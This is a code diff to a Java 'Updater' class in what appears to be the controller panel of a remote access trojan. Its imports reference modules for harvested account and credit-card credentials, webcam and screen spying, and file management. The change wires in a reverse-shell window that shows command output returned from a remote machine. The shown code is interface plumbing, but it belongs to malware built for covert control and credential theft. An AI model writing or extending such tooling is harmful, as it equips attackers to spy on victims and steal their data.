@@ -7,6 +7,7 @@ import GUI.TableUtils.Credentials.Packets.AccountCredentials;
 import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
 import GUI.TableUtils.Credentials.Packets.CreditCardCredentials;
 import GUI.TableUtils.FileManager.FileManagerGUI;
+import GUI.TableUtils.ReverseShell.ReverseShellGUI;
 import GUI.TableUtils.ScreenStreaming.ScreenStreamerGUI;
 import GUI.TableUtils.WebcamManager.WebcamGUI;
 import Information.NetworkInformation;
@@ -39,6 +40,8 @@ public class Updater {
     private ScreenStreamerGUI screenStreamerGUI;
 
     private CredentialsManagerGUI credentialsManagerGUI;
+
+    private ReverseShellGUI reverseShellGUI;
 
     private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
         String operatingSystem = jsonObject.getString("win_ver");
@@ -189,6 +192,13 @@ public class Updater {
         });
     }
 
+    public void updateReverseShell(JSONObject jsonObject){
+        JTextArea textArea = reverseShellGUI.getTextAreaOfResult();
+        textArea.append(jsonObject.getString("result"));
+        textArea.setCaretPosition(textArea.getDocument().getLength());
+
+    }
+
     public void updateFrameOfScreenStreamer(byte[] finalData) {
         ImageIcon tempIMG = new ImageIcon(finalData);
         Image img = tempIMG.getImage();
@@ -257,5 +267,9 @@ public class Updater {
 
     public void setCredentialsManagerGUI(CredentialsManagerGUI credentialsManagerGUI) {
         this.credentialsManagerGUI = credentialsManagerGUI;
+    }
+
+    public void setReverseShellGUI(ReverseShellGUI reverseShellGUI) {
+        this.reverseShellGUI = reverseShellGUI;
     }
 }
